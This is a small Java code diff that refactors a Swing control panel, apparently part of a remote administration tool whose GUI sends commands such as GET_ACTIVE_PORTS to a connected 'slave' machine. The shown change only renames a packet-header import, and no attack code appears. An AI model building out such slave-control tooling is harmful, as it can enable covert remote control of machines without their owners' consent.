@@ -14,7 +14,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 
 @SuppressWarnings("serial")
@@ -38,7 +38,7 @@ public class PanelControlActivePorts extends PanelControlParent {
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				clear();
-				slave.addToSendQueue(Header.GET_ACTIVE_PORTS);
+				slave.addToSendQueue(OutgoingHeader.GET_ACTIVE_PORTS);
 			}
 		});
 		
